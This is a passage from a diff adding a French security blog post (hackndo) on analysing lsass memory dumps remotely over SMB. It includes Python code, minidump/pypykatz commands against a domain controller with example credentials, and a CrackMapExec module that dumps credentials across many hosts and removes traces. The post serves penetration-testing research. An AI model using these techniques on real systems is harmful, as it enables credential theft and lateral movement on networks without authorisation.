+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fpath</span><span class="p">,</span> <span class="n">mode</span><span class="p">):</span>
+        <span class="n">domainName</span><span class="p">,</span> <span class="n">userName</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">hostName</span><span class="p">,</span> <span class="n">shareName</span><span class="p">,</span> <span class="n">filePath</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_parseArg</span><span class="p">(</span><span class="n">fpath</span><span class="p">)</span>
+        <span class="s">"""
+        ImpacketSMBConnexion est une surclasse de impacket que j'ai écrite pour simplifier cet extrait de code
+        """</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__conn</span> <span class="o">=</span> <span class="n">ImpacketSMBConnexion</span><span class="p">(</span><span class="n">hostName</span><span class="p">,</span> <span class="n">userName</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">domainName</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__fpath</span> <span class="o">=</span> <span class="n">filePath</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__tid</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__connectTree</span><span class="p">(</span><span class="n">shareName</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__fid</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__conn</span><span class="o">.</span><span class="n">openFile</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__tid</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">__fpath</span><span class="p">)</span>        
+
+    <span class="s">"""
+    Parsing du nom de fichier pour récupérer les informations d'authentification
+    """</span>
+    <span class="k">def</span> <span class="nf">_parseArg</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+        <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">r"^(?P&lt;domainName&gt;[a-zA-Z0-9.-_]+)/(?P&lt;userName&gt;[^:]+):(?P&lt;password&gt;[^@]+)@(?P&lt;hostName&gt;[a-zA-Z0-9.-]+):/(?P&lt;shareName&gt;[^/]+)(?P&lt;filePath&gt;/(?:[^/]*/)*[^/]+)$"</span><span class="p">)</span>
+        <span class="n">matches</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">matches</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">"{} is not valid. Expected format : domain/username:password@host:/share/path/to/file"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">arg</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">matches</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span>
+        
+
+    <span class="s">"""
+    Ouverture du fichier distant
+    """</span>
+    <span class="k">def</span> <span class="nf">__enter__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__fid</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__conn</span><span class="o">.</span><span class="n">openFile</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__tid</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">__fpath</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">self</span>
+
+    <span class="s">"""
+    Fermeture de la connexion
+    """</span>
+    <span class="k">def</span> <span class="nf">__exit__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">exc_type</span><span class="p">,</span> <span class="n">exc_val</span><span class="p">,</span> <span class="n">exc_tb</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    
+    <span class="k">def</span> <span class="nf">close</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="s">"""
+    Lecture de @size octets
+    """</span>
+    <span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">b</span><span class="s">''</span>
+        <span class="n">value</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__conn</span><span class="o">.</span><span class="n">readFile</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__tid</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">__fid</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">value</span>
+
+    <span class="s">"""
+    Déplacement du pointer d'offset
+    """</span>
+    <span class="k">def</span> <span class="nf">seek</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">whence</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">whence</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span> <span class="o">=</span> <span class="n">offset</span>
+
+    <span class="s">"""
+    Retourne l'offset actuel
+    """</span>
+    <span class="k">def</span> <span class="nf">tell</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span>
+</code></pre></div></div>
+
+<p>Nous avons donc notre nouvelle classe qui s’authentifie sur un partage réseau, et peut lire un fichier distant avec les méthodes citées. Si nous indiquons à minidump d’utiliser cette classe au lieu de la méthode <code class="highlighter-rouge">open</code> classique, alors minidump va lire le contenu distant sans sourciller.</p>
+
+<p><a href="/assets/uploads/2019/11/minidump_patched.png"><img src="/assets/uploads/2019/11/minidump_patched.png" alt="Remote Minidump" /></a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>minidump adsec.local/jsnow:Winter_is_coming_\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp
+</code></pre></div></div>
+
+<p>Et de la même manière, pypykatz utilisant minidump, il pourra analyser le dump distant sans le télécharger complètement.</p>
+
+<p><a href="/assets/uploads/2019/11/pypykatz_patched.png"><img src="/assets/uploads/2019/11/pypykatz_patched.png" alt="Remote Pypykatz" /></a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pypykatz lsa minidump adsec.local/jsnow:Winter_is_coming_\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp
+</code></pre></div></div>
+
+<h3 id="optimisations">Optimisations</h3>
+
+<p>Nous avons maintenant un moyen de lire et analyser un dump lsass à distance, sans avoir à télécharger les 150Mo de dump sur notre machine, c’est une belle avancée ! Cependant, même si nous ne devons pas tout télécharger, le dump prend beaucoup de temps, presqu’autant que le téléchargement. Cela est dû au fait qu’à chaque fois que minidump veut lire quelques octets, une nouvelle requête est effectuée vers le serveur distant. C’est très couteux en temps, et en ajoutant un peu de log, on se rend compte que minidump fait beaucoup, beaucoup de demandes de 4 octets.</p>
+
+<p>Une solution que j’ai mise en place pour pallier ce problème est de créer un buffer local, et imposer un nombre minimal d’octets à lire lors d’une requête pour réduire l’overhead. Si une requête demande moins de 4096 octets, et bien nous demanderons quand même 4096 octets, que nous sauvegarderons en local, et nous ne reverrons que les 4 premiers.</p>
+
+<p>Lors des appels suivant à la fonction <code class="highlighter-rouge">read</code>, si la taille de données demandée est dans le buffer local, on renvoie directement le buffer local, ce qui est bien plus rapide. Si en revanche la donnée n’est pas dans le buffer, alors un nouveau buffer de 4096 octets sera demandé.</p>
+
+<p>Cette optimisation fonctionne très bien car minidump effectue beaucoup de lectures concomitantes. Voici comment elle a été mise en place.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+    <span class="s">"""
+    On envoie une chaine vide si la taille est 0
+    """</span>
+    <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">b</span><span class="s">''</span>
+
+    
+    <span class="k">if</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"offset"</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span> <span class="o">&lt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"offset"</span><span class="p">]</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"size"</span><span class="p">]</span>
+            <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"offset"</span><span class="p">]</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"size"</span><span class="p">]</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span> <span class="o">+</span> <span class="n">size</span><span class="p">):</span>
+        <span class="s">"""
+        Si les octets demandés sont inclus dans le buffer local self.__buffer_data["buffer"], on renvoie directement la valeur
+        """</span>
+        <span class="n">value</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"buffer"</span><span class="p">][</span><span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"offset"</span><span class="p">]:</span><span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"offset"</span><span class="p">]</span> <span class="o">+</span> <span class="n">size</span><span class="p">]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="s">"""
+        Sinon, on demande le buffer au fichier distant
+        """</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"offset"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span>
+
+        <span class="s">"""
+        Si la demande est inférieure à self.__buffer_min_size octets, on prendra quand même self.__buffer_min_size octets
+        Et on stockera le surplus pour les prochains appels.
+        """</span>
+        <span class="k">if</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_min_size</span><span class="p">:</span>
+            <span class="n">value</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__conn</span><span class="o">.</span><span class="n">readFile</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__tid</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">__fid</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_min_size</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"size"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_min_size</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">__total_read</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_min_size</span>
+            
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">value</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__conn</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__tid</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">__fid</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"size"</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">__total_read</span> <span class="o">+=</span> <span class="n">size</span>
+        
+        <span class="bp">self</span><span class="o">.</span><span class="n">__buffer_data</span><span class="p">[</span><span class="s">"buffer"</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
+
+    <span class="bp">self</span><span class="o">.</span><span class="n">__currentOffset</span> <span class="o">+=</span> <span class="n">size</span>
+    <span class="s">"""
+    On ne renvoie que ce qui est nécessaire
+    """</span>
+    <span class="k">return</span> <span class="n">value</span><span class="p">[:</span><span class="n">size</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>Cette optimisation permet de drastiquement gagner du temps. Voici un benchmark fait sur ma machine :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python no_opti.py
+Function=minidump, Time=39.831733942
+
+$python opti.py
+Function=minidump, Time=0.897719860077
+</code></pre></div></div>
+
+<p>Sans cette optimisation, le script prenait environ 40 secondes, tandis qu’avec l’optimisation, il prend moins d’une seconde. Moins d’une seconde pour extraire les secrets d’authentification d’un dump lsass distant de plus de 150Mo !</p>
+
+<h2 id="module-crackmapexec">Module CrackMapExec</h2>
+
+<p>Avec ce nouveau minidump, j’ai modifié le module CrackMapExec qui permet cette fois d’aller dumper lsass sur un ensemble de machines distantes, d’extraire les mots de passe <strong>à distance</strong> sur ces dumps, et de supprimer les traces de mon passage après coup.</p>
+
+<p>Comme pypykatz et minidump ne fonctionnent que sous python3.6+ et que CrackMapExec n’est pas encore compatible avec python3, je ne peux pas faire de pull request pour le moment, ni importer pypykatz dans mon module. Pour le moment, l’appel à pypykatz se fait via une exécution de commande shell.</p>
+
+<p><a href="https://twitter.com/mpgn_x64">mpgn</a> est en train de travailler sur le <a href="https://github.com/byt3bl33d3r/CrackMapExec/pull/323">port de CrackMapexec vers python 3</a>, et quand ce sera fait, je proposerai ce module à Byt3bl33d3r pour intégration dans l’outil.</p>
+
+<h2 id="nouveaux-outils">Nouveaux outils</h2>
+
+<p>En attendant tout ça, voici deux outils que j’ai développés pour concrétiser ces recherches :</p>
+
+<p><a href="https://github.com/Hackndo/lsassy">lsassy</a> est disponible sur mon <a href="https://github.com/Hackndo/lsassy">Github</a> ou sur <a href="https://pypi.org/project/lsassy/">Pypi</a>. C’est l’interface entre Pypykatz et la cible, qui permet de lire le dump de lsass à distance, avec les optimisations dont on a parlé dans cet article.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Le module CrackMapExec](https://github.com/Hackndo/lsassy/tree/master/cme) permet d'automatiser tout le processus en faisant un dump de lsass sur les machines distantes, et en extrayant les identifiants des personnes connectées en utilisant **lsassy**. Il permet également de détecter les comptes ayant un chemin d'attaque pour devenir administrateur du domaine, en s'appuyant sur les données collectées avec l'outil [Bloodhound](/bloodhound)
+</code></pre></div></div>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Il reste du travail à faire pour intégrer ces changements à CrackMapExec, que ce soit au niveau compatibilité des versions de python, propreté et maintenabilité du code, mais ces recherches me sont très utiles pour mieux comprendre les outils que j’utilise au quotidien.</p>
+
+<p>J’ai aujourd’hui un outil qui fonctionne bien, rapidement, et qui peut être intégré à CrackMapExec en utilisant quelques tricks, donc qui me sert grandement dans mes tests internes, et j’espère que ça pourra vous être utile.</p>
+
+<p>J’espère que cet article vous donnera de nouvelles idées pour faire évoluer les outils d’infosec que nous utilisons au quotidien, à plus tard pour un nouvel article !</p>
+
+  </article>
+</div>
+<div class="keywords">
+    <span class="post-tags"><a href="/archives/#active-directory"><i class="fas fa-tags"></i> Active Directory</a><a href="/archives/#windows"><i class="fas fa-tags"></i> Windows</a></span>
+  </div>
+
+
+<br />
+<div class="box">
+  <div class="dash">
+    <div class="picture">
+      <img src="/assets/icones/pixis_logo.png" alt="logo" title="logo" />
+    </div>
+    <div class="box_content">
+      <strong>Auteur</strong> : <a href="/contact/" target="_blank">Pixis</a><br />
+      Créateur du blog, suivez-moi sur <a href="https://twitter.com/HackAndDo/" target="_blank">twitter</a> ou <a href="https://discord.gg/9At6SUZ" target="blank">discord</a>
+    </div>
+    
+  </div>
+</div>
+
+
+<div class="related">
+  <h2>Articles similaires</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pass-the-hash/">
+            Pass the Hash
+            <small>18 Dec 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/bloodhound/">
+            BloodHound
+            <small>30 Jul 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/resource-based-constrained-delegation-attack/">
+            Resource-Based Constrained Delegation - Risques
+            <small>05 May 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+        this.page.url = 'http://localhost:4000/remote-lsass-dump-passwords/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '0000-0000-0000-00b3';
+    };
+    
+    (function() {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        
+        s.src = '//hackndo.disqus.com/embed.js';
+        
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+        </div>
+    </main>
+    <script src="/assets/js/jquery-2.1.4.js"></script>
+    <script src="/assets/js/jquery.menu-aim.js"></script>
+    <script src="/assets/js/anchor.min.js"></script>
+    <script src="/assets/js/main.js"></script> <!-- Resource jQuery -->
+  </body>
+</html>
